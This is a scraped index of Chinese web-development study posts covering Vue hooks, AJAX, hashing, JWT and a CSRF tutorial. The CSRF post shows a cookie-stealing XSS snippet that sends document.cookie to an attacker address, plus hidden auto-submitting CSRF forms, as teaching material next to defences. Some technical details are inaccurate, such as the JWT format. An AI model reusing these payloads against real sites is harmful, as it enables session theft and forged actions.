現在在頁面上新增一個按鈕，用來增加 a的值： 1234&lt;div id=\"app\"&gt; &lt;p class=\"num\"&gt;{{ a }}&lt;/p&gt; &lt;button class=\"btn\" @click=\"a++\"&gt;add&lt;/button&gt;&lt;/div&gt; 當按下按鈕後，結果如下： 123456789Hook beforeUpdate試著擷取a的值：2試著擷取el的值：[object HTMLDivElement]試著擷取el的outerHTML：&lt;div id=\"app\"&gt;&lt;p class=\"num\"&gt;1&lt;/p&gt; &lt;button class=\"btn\"&gt;add&lt;/button&gt;&lt;/div&gt;Hook updated試著擷取a的值：2試著擷取el的值：[object HTMLDivElement]試著擷取el的outerHTML：&lt;div id=\"app\"&gt;&lt;p class=\"num\"&gt;2&lt;/p&gt; &lt;button class=\"btn\"&gt;add&lt;/button&gt;&lt;/div&gt; 🚀 Codepen：點這裡 beforeUpdate： 在畫面重新渲染之前，實體中的 a 已經被更新為 2，但畫面顯示的還是未更新前的資料 1。 updated：當畫面重新渲染後，畫面也會被渲染成更新後的資料 2。 beforeDestroy 與 destroyed現在加上beforeDestroy 與 destroyed： 1234567891011121314let vm = new Vue({ el: '#app', data: { a: 1 }, beforeDestroy() { console.log('Hook beforeDestroy') console.log(' ') }, destroyed() { console.log('Hook destroy') console.log(' ') }}) 再加上一個用來觸發 destroy() 撤銷的按鈕： 1234567&lt;div class=\"wrap\"&gt; &lt;div id=\"app\"&gt; &lt;p class=\"num\"&gt;{{ a }}&lt;/p&gt; &lt;button class=\"btn\" @click=\"a++\"&gt;add&lt;/button&gt; &lt;button class=\"btn\" @click=\"$destroy()\"&gt;Destroy instance&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; 當按下按鈕時，結果如下： 123Hook beforeDestroyHook destroy 🚀 Codepen：點這裡 beforeDestroy：表示即將執行銷毀動作，如果有些物件要釋放資源可以在這處理。 destroy：此時實體已經銷毀。 參考資料介绍 — Vue.js重新認識 Vue.js | Kuro Hsu[Vue] 還是不懂 Computed ？vue.js 计算属性 computed【getter 和 setter 的一些思考】那些關於 Vue 的小細節 - Computed 中 getter 和 setter 觸發的時間點[Vue.js] updated()，要怎麼用！面试官：为什么 Vue 中的 v-if 和 v-for 不建议一起用?","link":"/2021/08/26/vue/"},{"title":"week10 綜合能力測驗","text":"簡單紀錄 簡述這是來自第十週的 綜合能力測驗。寫這篇只是想記錄一下最後一題的解法，有興趣的人可以自行去玩玩看。 最後一題最後的提示是要去看 JavaScript 的 code，所以 devtool &gt; sources 打開 script.js 會看到這段： 123456789101112131415161718192021222324252627$(document).ready(function () { $('#goForIt').on('click', function () { console.log('你成功按下按鈕了！') if (typeof myMissingNumberToSetToMakeTheRequest !== 'undefined') { $.ajax({ url: './ajax.php', type: 'GET', data: 'number=' + myMissingNumberToSetToMakeTheRequest, dataType: 'json', success: function (data) { console.log('成功發送 ajax request') console.log(data) if (data['error'] === false) { var result = data['s'] console.log('Result: ' + result) } else { console.log('error: ' + data['error']) } } }) } else { console.log('少了些什麼...') } })}) 正確的做法是先把 #goForIt 抓出來並設定 myMissingNumberToSetToMakeTheRequest 的值來送 request。但仔細觀察後會發現有更快的做法，只要發 request 到 http://mentor-program.co/huli/game/ajax.php?number=xxx 拿 response 就好了。 number 的範圍是 1 ~ 100，所以就寫個暴力解的 function： 1234567891011121314151617181920// 單個 responsefunction getResponse(n) { return new Promise((resolve, reject) =&gt; { const xhr = new XMLHttpRequest() xhr.open('GET', `http://mentor-program.co/huli/game/ajax.php?number=${n}`, true) xhr.onload = () =&gt; { resolve(JSON.parse(xhr.responseText)) } xhr.send() })}// 發出 100 次 request~(async function getAllResponse() { for (let i = 1; i &lt;= 100; i++) { console.log(i) const json = await getResponse(i) console.log(json) }})() 備註：後來發現這題沒有開 CROS，所以如果要把這段拿去跑的話，請先到 http://mentor-program.co/huli/game/ajax.php?number=1 這個 Domain 下再貼到 console 裡；或是改用 Node.js 來發 request 也行。 最後答案就出來囉：","link":"/2022/02/12/week10-game/"},{"title":"Encode、Encrypt 跟 Hash 的差別","text":"小知識大學問。 懶人包Encode 編碼 用另一種方式表示資料 毫無安全性，因為本來的用途就不是為了安全 Encrypt 加密 一對一的關係（一個明文對應一組密文） 需要透過 key（金鑰）來執行 可以從結果逆推回去 可以在細分為對稱式與非對稱式 Hash 雜湊 一對多的關係（無限的輸入，有限的輸出） 不可以逆推回去（就算你知道演算法是什麼） 同樣的東西丟進去，出來的結果永遠一樣 Encode 編碼其實只用另一種方式來「表示資料」，例如 URI 編碼，假設我們有段網址是 https://www.google.com/search?q=無慘，接著用 JavaScript 中的 encodeURI 就會變成 'https://www.google.com/search?q=%E7%84%A1%E6%85%98'，如果要轉回去就改用 decodeURI： 1234encodeURL('https://www.google.com/search?q=無慘')// https://www.google.com/search?q=%E7%84%A1%E6%85%98decodeURI('https://www.google.com/search?q=%E7%84%A1%E6%85%98')// https://www.google.com/search?q=無慘 為什麼要做編碼，以 URI 來說有兩個理由： 不是每個人的電腦都有支援中文 某些字元會跟程式產生衝突，例如 = ' \" 等等 還有另外一個很有趣的例子是 base64。假設我想要把圖片用「純文字」傳給某個人，我可以這樣做： 1cat picture.jpg | base64 &gt; picture.txt 這時候 picture.txt 的內容就會是一段看了就暈的碼： 123456/9j/4AAQSkZJRgABAQEAeAB4AAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQkUDQsNFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAOGBagDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3..... 接著拿到文字檔的人只要解碼就可以得到圖片： 12# 加上 -d = decodecat picture.txt | base64 -d &gt; cool.jpg 一樣附上精美圖片： Encrypt 加密加密就是用一個 key（金鑰）來把「明文」變成「密文」，最簡單的例子是「凱薩加密」。凱薩加密是把每個字母做位移，而位移的數量就是加密的 key。 123456789101112131415161718function caesarCipher(s, key) { let result = '' for (let i = 0; i &lt; s.length; i++) { // 取得 ASCII CODE const code = s.charCodeAt(i) // 位移後的數字 let m = code + (key % 26) // 如果超出範圍 if (m &gt; 122) { // 取餘數，並加上 96，因為 a 從 97 開始 m = (m % 122) + 96 } // 轉回文字 result += String.fromCharCode(m) } return result}caesarCipher('A', 3) // 位移三次，所以是 D 只要知道 key，就可以把結果逆推回去。 這個是加密最大的特點。像上面的例子只要知道 key 是 3，就能逆推回去，從 D 推回 A。 對稱式加密與非對稱式加密另外加密還可以分成「對稱式加密」跟「非對稱式加密」。簡單來說，對稱式就是雙方都是用同一個 key 來做加密跟解密，而非對稱式是把 key 分成「公鑰」與「私鑰」。 為什麼要這樣做？假設小明跟小美的對話是用凱薩加密來做加密，那雙方一定要知道 key 是什麼才能加密跟解密對吧？但網路的世界是不安全的（在沒有 HTTPS 以前），除非小明小美在現實就約出來事先講好 key 是什麼，不然只要透過網路就有機會被「中間人」把 key 偷走，這樣就算你用在厲害的加密方式都沒有意義了。 非對稱式加密就是為了解決同一個 key 的問題而誕生。你要對一個檔案加密就用「公鑰」，要解密就用只有你自己知道的「私鑰」。這樣子就算中間人把公鑰偷走了他也沒辦法解密，因為用公鑰加密的內容只能用私鑰解。 參考這段例子： 同樣的情況當你要傳檔案給 Alice，就先請 Alice 生一組 Key 然後把公鑰傳給你。你有了 Alice 產生的公鑰之後，就用公鑰幫檔案加密再傳給她，Alice 收到就可以用她自己手上的私鑰解開 安全性方面，因為私鑰從頭到尾都在 Alice 手上，完全沒有傳出去過，所以即便中間人取得公鑰加密後的檔案也沒辦法解開，超安全 der Hash 雜湊Hash 就是把一個 function，把一段文字或數字丟進去之後會產生一個結果，例如說： 123let str = 'hello'let hash = SHA256(str)console.log(hash) // 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824 我不管丟進去幾次 hello 永遠都會得到 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824，這個是雜湊的特性。所以要判斷兩個東西是不是一樣的，只要看雜湊後的值一不一樣就知道了。 另外有一種可能是不同的 input 雜湊後的值一樣，這個叫做「碰撞」，但機率很小很小很小（1/2¹²⁸），所以基本上可以忽略。 這是因為無限的輸入，有限的輸出所造成的，就好像鴿籠原理一樣，所以難免會有這種情況發生。 備註：鴿籠原理 = 10 隻鴿子放進 9 個鴿籠，那麼一定有一個鴿籠放進了至少兩隻鴿子 所以雜湊有個最重要的特性是： 沒有辦法從結果逆推回去 沒有辦法從結果逆推回去 沒有辦法從結果逆推回去 為什麼？假設我有個雜湊函式長這樣： 1234567function hash(n) { return n % 999}console.log(hash(1)) // 1console.log(hash(1000)) // 1console.log(hash(1001)) // 2console.log(hash(2000)) // 2 就算我現在知道這個 hash 的演算法是什麼，但是在我只知道結果是 2 的時候要怎麼知道原本是 1001 還是 2000？都有可能阿。所以這就是為什麼雜湊沒有辦法被逆推。","link":"/2022/02/08/what-are-encoding-encrypt-and-hashing/"},{"title":"new 實際上在做什麼？","text":"比我們想的都還簡單 簡述其實 new 背後做的事情很簡單： 建立一個空物件 把空物件丟到 constructor 裡面執行 把 __proto__ 指向對應的 prototype 回傳 instance 附註：要理解這個範例要先理解 apply 或 call 的用法，可以參考 function 中的 call apply bind 12345678910111213141516171819202122function Person(name, age) { this.name = name this.age = age}Person.prototype.log = function () { console.log(this.name + ', ' + this.age)}function newInstance(Constructor, arguments) { const obj = {} // 執行 Constructor，並把 this 指向 obj Constructor.apply(obj, arguments) // 設定 __proto__ 對應到哪個 prototype obj.__proto__ = Constructor.prototype // 回傳 instance return obj}// 因為是 apply 所以參數要用陣列來傳入const peanu = newInstance(Person, ['peanu', 23])// peanu, 23peanu.log()","link":"/2022/03/18/what-does-new-doing/"},{"title":"SDK 與 API 之間的關係","text":"知道一下就好 簡單來說SDK （Software development kit）軟體開發套件 可以想成是一個寫好的 library，裡面可能會幫你把 API 包裝起來，要用的時候比較簡單。 以 twitter 為例，假設要存取某筆資料，原本可能是： 1GET https://api.twitter.com/1.1/statuss/home_timeline.json 變成 SDK 的話只要： 1twitter.getTimeline() 就是比較方便而已啦！","link":"/2022/01/04/what-is-SDK/"},{"title":"什麼是 AJAX？","text":"覺得寫得還不錯所以存一下。（自肥？） 簡述我一直覺得這名字念起來很饒口：Asynchronous JavaScript and XML，AJAX（非同步的 JavaScript 與 XML）。 簡單來說就是利用 JavaScript 中的「非同步」行為來跟伺服器拿「資料」。另外以前的資料格式大多是 XML 所以最後一個字才會是 X（XML）。不過現在都是以 JSON 的資料為主了，因此改叫 AJAJ（Asynchronous JavaScript and JSON）說不定更符合現代背景。 我覺得 AJAX 的重點其實是指「非同步」的觀念，因為就算不用 AJAX 這個「技術」，你一樣能跟伺服器拿資料，只是使用者體驗會不好罷了。 同步與非同步到底非同步是什麼？很簡單，直接舉例： 123console.log('yo')for (let i = 0; i &lt;= 1000000000; i++) {}console.log('so long~') 出來的順序是：yo -&gt; （等迴圈大概一秒） -&gt; so long~ 這個「等」一行跑完才往下執行的行為就叫做為「同步」。 再來看一段： 123console.log('yo')setTimeout(() =&gt; console.log(\"I'm async\"), 1000)console.log('so fast') 出來的順序是：yo -&gt; so fast -&gt; I'm async 這邊在執行到第二行的時候就「不等了」，繼續往下執行的行為就叫做「非同步」。 AJAX 要的就是這個「非同步」的行為，因為我們不希望在跟伺服器拿資料時你的程式卡在那邊等 response。你想想看如果要等的話使用者體驗有多糟？ 12345678910111213141516171819202122232425262728293031323334function getData(callback) { const xhr = new XMLHttpRequest() /* 注意這邊的最後一個參數 async 是 false， 代表我要讓這段 request 是「同步」執行*/ xhr.open('GET', 'https://gorest.co.in/public/v1/users', false) xhr.onload = () =&gt; { if (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 400) { callback(null, xhr.responseText) } else { callback('error!') } } xhr.send()}// 點按鈕就顯示 clickconst button = document.querySelector('button')button.onclick = () =&gt; console.log('click')// 跟伺服器拿資料，這邊因為設定成同步，所以會「卡在這裡等」getData((err, data) =&gt; { if (err) { console.log(err) } else { console.log(data) }})// 手動太慢了，所以用程式來點 10 下按鈕for (let i = 0; i &lt; 10; i++) { button.click()} 你拿去跑跑看就知道（記得要先寫好 HTML 的 &lt;button&gt;），不管重新整理幾次 click 都會在「拿到 response 之後」才執行。為什麼？因為我讓它變成同步，所以這代表在拿到 response 之前完全不能做任何事。 以上就是同步跟非同步的差別。","link":"/2022/01/29/what-is-ajax/"},{"title":"認識 CSRF","text":"結果還是來填坑了。 簡述本來是沒打算寫這篇的，但這個攻擊方式對於資安來說似乎還蠻重要的，因此還是來記錄一下好了。 CSRF（Cross Site Request Forgery）跨網站偽造請求。是一種攻擊方式，但要特別注意它和 XSS 是不一樣的東西。這兩個可以單獨使用，也可以合在一起用。 區分 XSS 與 CSRF 的差別這兩個實際上到底差在哪裡？我是這樣想的：XSS 的欺騙對象是使用者，CSRF 的欺騙對象是伺服器。 XSS 是你到一個你以為安全的網站，但實際上不是，這個網站可能已經被 XSS 注入： 12345678910// 駭客想要送到的地方let address = 'http://localhost:5000'// 建立 &lt;img&gt;let img = document.createElement('img')// 存取 cookie 的代碼let cookie = document.cookie// 設定 &lt;img src=\"http://localhost:5000?cookie=value\"&gt;img.setAttribute('src', `${address}/?cookie=${encodeURIComponent(cookie)}`)// 插到 DOM 裡面document.body.appendChild(img) 所以駭客就這樣騙走了你（使用者）的 Cookie。 CSRF 是透過「偽造的身分（通常是 session id）」來發出假的 request 給伺服器。例如有個惡意網站： 12&lt;img src=\"http://localhost/peanu/real-blog/handle_admin_delete_post.php?id=92\" width=\"0\" height=\"0\" /&gt;&lt;a href=\"#\"&gt;點我發大財&lt;/a&gt; 上面 &lt;img&gt; 的連結是「刪除某篇文章」的 request。 一般來說，刪除文章必須要有管理員的權限，所以 server 會先檢查 session id 是否符合才判斷要不要執行。但是當管理員是在已經登入成功的情況下來到上面的惡意網站呢？ 這時候 server 就會以為這個 request 是管理員發的（因為瀏覽器的機制是只要到了某個網域，就會自動帶上 cookie，而 cookie 存的就是 session id），所以就真的把文章刪除了。 所以這就是這兩個最大的差異，我覺得啦。 實際示範 CSRF這邊拿我做的部落格來實驗，假設有個惡意網站內容長這樣： 1234// 刪除文章的連結&lt;img src=\"http://localhost/peanu/real-blog/handle_admin_delete_post.php?id=96\" width=\"0\" height=\"0\" /&gt;// 障眼法&lt;a href=\"#\"&gt;點我發大財&lt;/a&gt; 結果就會像這樣： 簡單解釋一下流程： 使用者處於登入狀態 打開惡意網站 惡意網站利用 GET 發請求到 handle_admin_delete_post.php?id=96 刪除 id=96 的文章。 這就是 CSRF 可怕的地方（Cross Site），你可以在別的地方對 server 發出 request，而 server 還真的會乖乖照你說的做。 這裡之所以能用 &lt;img&gt; 或 &lt;a&gt; 來發 request 是因為刪除文章用的是 GET。但如果改成 POST 呢？ 這邊直接節錄 讓我們來談談 CSRF 的範例。 改成用 Form 表單 POST，這樣就不能用 &lt;img&gt; &lt;a&gt; 來偽造： 1234&lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"id\" value=\"3\" /&gt; &lt;input type=\"submit\" value=\"發大財\" /&gt;&lt;/form&gt; 一樣是 CSRF，但現在頁面會跳轉，使用者會發現怪怪的。 可是駭客非常有想像力，它還是有辦法讓使用者不要察覺： 1234567891011&lt;!-- 看不到的 iframe --&gt;&lt;iframe style=\"display:none\" name=\"csrf-frame\"&gt;&lt;/iframe&gt;&lt;!-- 在這邊指定 target，就只有 iframe 裡的頁面會跳轉 --&gt;&lt;form method=\"POST\" action=\"https://small-min.blog.com/delete\" target=\"csrf-frame\" id=\"csrf-form\"&gt; &lt;input type=\"hidden\" name=\"id\" value=\"3\" /&gt; &lt;input type=\"submit\" value=\"submit\" /&gt;&lt;/form&gt;&lt;!-- 順便用 JS 直接送出表單，使用者連點不用點 --&gt;&lt;script&gt; document.getElementById('csrf-form').submit()&lt;/script&gt; 所以我常說當駭客除了要懂程式以外，還要非常有創意，真的太驚喜了。 防範方式總之呢，CSRF 的攻擊手法還蠻多的，詳細可以參考 讓我們來談談 CSRF，裡面寫的很詳細。 至於要怎麼防範呢？可以先思考一下 CSRF 是怎麼成立的。 CSRF 最大的漏洞在於 server 只檢查 cookie 的 session_id，但沒有檢查 request 是從哪裡發過來的。 所以有幾種做法： 檢查 Referer 通常 request header 都會有個 refer 欄位，告訴你 request 是從哪裡發來的。不過這個方法不太靠譜： 不是所有瀏覽器都會帶上 refer 使用者可能自己關掉 refer 功能（這樣連自己都被擋掉） 判斷 refer 的邏輯沒寫好就會 GG 圖形驗證碼、簡訊驗證碼 這個做法蠻靠譜的，但問題是使用體驗很差（每次刪文章都要做驗證） 加上 CSRF token 大概是像這樣： 123456&lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"id\" value=\"3\" /&gt; &lt;!-- 這個 token 由 server 產生 --&gt; &lt;input type=\"hidden\" name=\"csrftoken\" value=\"fj1iro2jro12ijoi1\" /&gt; &lt;input type=\"submit\" value=\"刪除文章\" /&gt;&lt;/form&gt; （sever 自己那邊也要存一個對應的 token） 這樣子就得先知道 token 是 fj1iro2jro12ijoi1 才有辦法通過 server 的驗證，不過問題是如果有開 CROS 的話就會破功： 利用管理員的登入狀態發 AJAX 到 admin_post.php 取得 token 在用 AJAX 發 POST 帶上 id 和 token 騙過 server （不確定寫得對不對，但我猜是這樣） 用瀏覽器提供的功能來設定 cookie SameSite（推薦） 簡單來說只要是跨 Domain 的 request 一律擋掉。在 PHP 可以這樣設定： 12345678910111213141516171819// 設定 session 的部分session_set_cookie_params([ 'lifetime' =&gt; 3600, 'path' =&gt; '/peanu/real-blog/', 'domain' =&gt; 'localhost', 'secure' =&gt; TRUE, 'httponly' =&gt; TRUE, 'samesite' =&gt; 'Lax']);// 設定 cookie 的部分setcookie('test', 'test', [ 'expires' =&gt; time() + 86400, 'path' =&gt; '/peanu/real-blog/', 'domain' =&gt; 'localhost', 'secure' =&gt; TRUE, 'httponly' =&gt; TRUE, 'samesite' =&gt; 'Lax',]); 這裡做個補充，如果你要確保 cookie 依照上面來設定，最好是在所有會用到 session_start() 的頁面做相同的設定，才不會出現漏網之魚。（或也能拆出來寫成一個 session.php 之類的） 這部分我不太知道怎麼實作，所以只貼設定好的圖片給你看： 至於 samesite 有兩個設定值： Strict 在 Domain 範圍內的 request 才帶上 cookie（要貼登入狀態的東西給別人時不方便） Lax 比較寬鬆一點， GET 會帶 cookie，但其他像 POST, PUT, DELETE 就不帶（但這樣就擋不了 GET 的 CSRF） 以上。雖然還沒完全弄懂，但就先這樣子吧。","link":"/2022/02/22/what-is-csrf/"},{"title":"你覺得什麼是 API？","text":"我是這樣想的。 我認為最好的解釋我看過各種 API 的解釋，有人說是「雙方溝通的媒介」，有人說是「一個操作的介面」，有人說是「函式庫」等等，而我自己覺得認為最好理解的一句話是 「程式與程式之間溝通的介面」。 這個想法是我在 Javascript &amp; jQuery: Interactive Front-End Web Development 裡學到的，這本書裡面解釋 API 的方式很簡單。 試著想想看你在瀏覽網頁的時候，是不是充滿了各種元素可以讓你去跟他互動？例如說「滑鼠移過去的時候有東西有反應」或是「點下 ≡ 的時候就會彈一個東西出來」。 這個叫做「使用者介面（User interface design，UI）」，你必須透過這個介面才能跟網頁做互動，如果沒有這個介面，就什麼都做不了（除非你直接寫程式碼來操作）。 而 API 也是同樣的道理，只是它是 「工程師設計給工程師操作的『介面』」。 兩者不同的地方在於，UI 是透過「硬體設備（鍵盤、滑鼠）」來跟介面做溝通，API 是則透過「程式碼」來跟介面做溝通，其實說穿了都是在使用「被設計好的一個介面」，只是使用的方法不同而已。 舉例來說，工程師設計了一個介面（例如 ≡），讓使用者在滑鼠點下去的時候會彈出東西來，對應到 API 的話就會是後端工程師設計了一個介面（例如一個 function），讓前端工程師用程式碼來 call 這個 function 的時候可以拿到資料，或是執行某個功能。 然而要怎麼「設計」跟「使用」一個介面，其實都是雙方得互相達成共識的。如果工程師不設計一個 ≡ 來讓你可以點它，你就沒辦法做這件事，同理，如果工程師不設計一個 function，我就沒辦法 call 這個 function 來做某件事。 所以為什麼要有 UI 或 API？ 為了讓雙方能夠有一個溝通的管道，也就是「介面」 其實只是這樣簡單的道理而已。","link":"/2022/01/07/what-is-api/"},{"title":"什麼是 DNS？","text":"言簡意賅。 想想計程車司機如果你想搭計程車到「高雄火車站」，你應該會跟司機說：我要到高雄車站，而不是 我要到高雄市三民區建國二路 318 號。 在網路的世界也是一樣的，你可以用以下兩種方式來造訪 google。 方法一： 1https://www.google.com/ 方法二： 1172.217.160.110 實際上背後都是用第二種方式來帶你到 google 的，只是第一種方法 DNS 會幫你把「域名」轉成「IP 地址」才讓你也能造訪 google。 所以 DNS 就是個計程車司機，只要跟他說地標（域名），他就知道實際位置（IP 地址）在哪裡了。 nsloolup你也可以用 CMD 的 nslookup 來看一個域名對應到的 IP 地址是哪裡： 1nslookup github.com =&gt; 13.114.40.48","link":"/2022/01/05/what-is-dns/"},{"title":"什麼是 DOM？","text":"簡單快速。 解釋全名為「文件物件模型（Document Object Model, DOM）」。 把重點放在 Object 就好，因為 DOM 就是用來把「Document」（例如 HTML）轉換成「Object」的一個模型： 例如有段 HTML： 12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;My title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;A heading&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; 在 DOM 模型中大概就長這樣： 12345678910111213141516171819202122const document = { html: { head: { title: { text: 'My title' } }, body: { h1: { text: 'A heading' } } }, // 在 DOM 裡定義好的方法 getElementById: function(id) { ... }, // 在 DOM 裡定義好的方法 querySelector: function(selector) { ... }} 化成圖片： 能做什麼？讓我們可以透過 JavaScript 來存取 HTML 做一些操作，像是「改變畫面」之類的。 儘管寫的是 JavaScript 的語法但卻能操作 HTML。因此也可以把 DOM 想成是瀏覽器提供的一個「橋梁」，用 JavaScript 來跟瀏覽器溝通，透過 DOM 來告訴瀏覽器我們想對 HTML 做什麼。","link":"/2022/01/18/what-is-dom/"},{"title":"關於 event(e)","text":"以前還蠻陌生的東西。 簡述瀏覽器在幫我們呼叫 callback function 時，他會傳入一個參數：event 這裡面會放很多跟事件有關的東西，例如說： 123456const btn = document.querySelector('.btn')// event 只是個參數，所以你想取什麼名字都行// 例如：function(yoyoyo) 也是 OK 的btn.addEventListener('click', function(event) { console.log(event)}) Output： 12345678910111213// PointerEvent { isTrusted: true altKey: false altitudeAngle: 1.5707963267948966 azimuthAngle: 0 bubbles: true button: 0 buttons: 0 cancelBubble: false cancelable: true ...} 有點抽象的話可以想成這樣子： 123456789101112131415161718192021const btn = document.querySelector('.btn')btn.addEventListener('click', onClick)function onClick(event) { console.log(event)}// 瀏覽器呼叫 callback function 的時候onClick({ isTrusted: true altKey: false altitudeAngle: 1.5707963267948966 azimuthAngle: 0 bubbles: true button: 0 buttons: 0 cancelBubble: false cancelable: true ...}) event.target這是最常用到的一個東西，用來告訴你「是哪一個元素觸發事件（最直接的那個）」 沿用剛剛的例子： 1234const btn = document.querySelector('button')btn.addEventListener('click', function(event) { console.log(event.target)}) Output： 1&lt;button&gt;Click me&lt;/button&gt;","link":"/2022/01/18/what-is-event-parameter/"},{"title":"什麼是 Flux？","text":"一個現代前端框架的不可或缺的觀念。 簡述Flux 是一種「管理狀態的架構」。 在 Flux 推出之前，其實每個框架或是 library 都有各自管理狀態的方式： 在 jQuery 是「直接去改變畫面」 在 React 是「單向資料流」（只管 state） 在 Angular 或 Vue 是「雙向綁定」（改畫面 or 改資料） 然而當專案越來越大時，狀態管理就會變得越複雜，單靠原本的方式其實會有一些問題，所以臉書後來就推出了 Flux 這套架構來解決。 想知道臉書當時碰到什麼問題跟 Flux 更多的細節可以參考這部影片 總之呢，以 React 來說，我們原本在操作 state 的方式是這樣子： view 點了某個按鈕 -&gt; 更新 state -&gt; view 收到新的 state 附註：view 指的就是 React，畢竟它本來就把自己定義成一個 UI 庫。 而變成 Flux 以後的流程是： view 點了某個按鈕 -&gt; dispatch 一個 action -&gt; store 裡的 reducer 根據 action 回傳新的 state -&gt; view 收到新的 state 看起來多了一大堆繁瑣的步驟，但這樣子做其實是有原因的，可以先參考下面這兩張圖： 1. MVC 架構下的流程 2. Flux 架構下的流程 簡單來說，在 MVC 裡面任何人都可以隨便去改 state，但在 Flux 下就不行了，不管要做什麼得透過 action + dispatch 來做。 在沒有採用 Flux 這種架構時，要追蹤問題點會很困難，因為大家都可以直接去改 state，就會很難知道是誰改的？什麼時候改的？ 但是當採用了 Flux 以後，要追蹤 bug 時就能有一個直接的線索，像是「某個 action 是從哪個 view 發出的？」或是「state 是被哪個 action 改的？」等等。 所以這也是為什麼後來臉書會採用 Flux 的原因，其實回歸到原點還是為了管理狀態而已。","link":"/2022/04/23/what-is-flux/"},{"title":"理解那些五花八門的專有名詞：IaaS、PaaS 和 SaaS","text":"它們太常出現了，所以決定一次把它們搞懂。 簡述這些專有名詞都是指跟「雲端」有關的服務，所以只有跟「雲端」有關的服務才會用這些詞。 Infrastructure as a Service（IaaS） 設施即服務AWS 的 EC 就是屬於這一類型。只提供你硬體設備（虛擬主機），但作業系統，伺服器軟體的設定你都得自己來。 好處是彈性很大，缺點是沒有程式背景和一些網路運作概念的話會用到想哭。 Platform as a Service（PaaS） 平台即服務Heroku 或 Google App Engine 屬於這類型。你只要把專案丟上去就好，其他作業系統、伺服器軟體都不用擔心，平台會幫你處理好。 好處是簡單輕鬆，缺點是沒辦法依照個人喜好做細部調整。 Software as a Service（SaaS） 軟體即服務簡單來說就是「現成的軟體服務」，例如 Gmail 或 Office 365。 我看網路上的講解都覺得有點模糊，所以我舉一個比較簡單的例子： 先想想看，如果你想要有個跟 Gmail 一樣在網路上寄信的功能，那你該怎麼做？ 你要先有一台硬體設備（也就是主機），來搭建伺服器 你需要建立一個 Server 程式，來處理寄信和收信的 request 之類的 你需要寫一個信件軟體的應用程式 好，說到這邊是要告訴你，SaaS 就是負責幫你把以上這些全部都包辦好，你什麼都不用操心，只要記得「付錢」，然後「享受服務」就好了。","link":"/2022/03/11/what-is-iaas-paas-and-saas/"},{"title":"關於 JWT（JSON-Web-Token）","text":"一樣回來填坑。 什麼是 JSON Web Token？其實簡單來說就是： 用 JSON 格式的資料產生出的 Token 因為這東西經常應用在 Web 上，所以就簡稱為「JWT」了。我們可以先來看一個 JWT 長怎麼樣： 可以看到我分成兩個區塊，紅色區塊是「編碼和加密」後的結果，也就是實際 Token 的模樣；藍色的部分則是原始資料，是這個 Token 所富含的資訊，而且就是 JSON 的資料格式。 正如我所說，JWT 的背後就只是把 JSON 資料經過編碼和加密後再當成 Token 來用而已，不用想得太複雜。 JWT 的組成再來看一次這張圖： 這次不要管框線，而是注意「文字顏色」的部分。 紅字亂碼會對應到右邊的 HEADER，是經過 base64 編碼前的模樣 紫字亂碼會對應到右邊的 PAYLOAD，是經過 base64 編碼前的模樣 淡藍字亂碼的部分則對應到右邊的 SIGNATURE，是經過加密前的模樣 附註：你可以試著把紅字亂碼（eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9）跟紫字亂碼（eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlBlYU51IiwiaWF0IjoxNTE2MjM5MDIyfQ）的部分拿去 這裡 做 base64 解碼，就會懂我的意思了。 淡藍字的部分比較特別所以我多補充一下，這個地方叫做「簽章」，是 JWT 最重要的部分。 簡單來說就是用下面這個公式來算出最後的 Token： 1HMACSHA256(base64UrlEncode(header) + '.' + base64UrlEncode(payload), secret) 單看這段 code 應該就蠻清楚了，總之就是先經過 base64 編碼後在拼接起來做加密，所以最後的值才會是 header.payload.secret 這樣的格式。 至於 secret 的部分則是後端自己定義的一個值（可以是任何文字），總之重點就是絕對不能讓別人知道這個值是什麼，不然別人就可以偽造 JWT 了。 畢竟你看到現在會發現整個 JWT 真正有被加密的地方只有 secret 這一段而已，header 跟 payload 都只是純粹的 base64 編碼，只要拿去解碼就可以知道內容是什麼。 接下來介紹一下 Header、Payload、Secret 這三個 key 可以放些什麼內容。 Header alg 加密的演算法，可以是 HMAC、SHA256、RSA typ Token 的 type，大多數情況下只會填 JWT 範例： 1234{ \"alg\": \"HS256\", \"typ\": \"JWT\"} Payload簡單來說這邊是讓你「放一些訊息的地方」，術語上會稱作「聲明（Claim）」，但我覺得知道一下就好，就算記不得也沒關係。 這邊會列出幾個屬於「標準規範（Registered claims）」中的內容（意思就是建議你放，但不放也沒關係啦） iss（Issuer）誰發的 JWT exp（Expiration Time）JWT 的過期時間 sub（Subject）這個 JWT 的所有人（類似作者的概念吧） aud（Audience）預期誰會接收這個 JWT nbf（Not Before）JWT 的生效時間 iat（Issued At）JWT 的建立日期 jti（JWT Id）JWT 自身 的 ID（不可重複） 除了這些以外，你也可以定義自己的聲明（Private claims），像是 name、admin 之類的。 範例： 12345{ \"sub\": \"1234567890\", // Registered \"account\": \"kenny@example.com\", // Private \"role\": \"admin\" // Private} Secret剛剛有說過，這部分就是讓後端自定義的字串，接著再跟編碼後的 header + payload 來組合後再拿去加密。 1HMACSHA256(base64UrlEncode(header) + '.' + base64UrlEncode(payload), secret) 還是在強調一次，這個 secret 絕對不能洩漏出去，不然就沒有任何意義了。 JWT 怎麼用？ 用使用者的帳號密碼打後端的 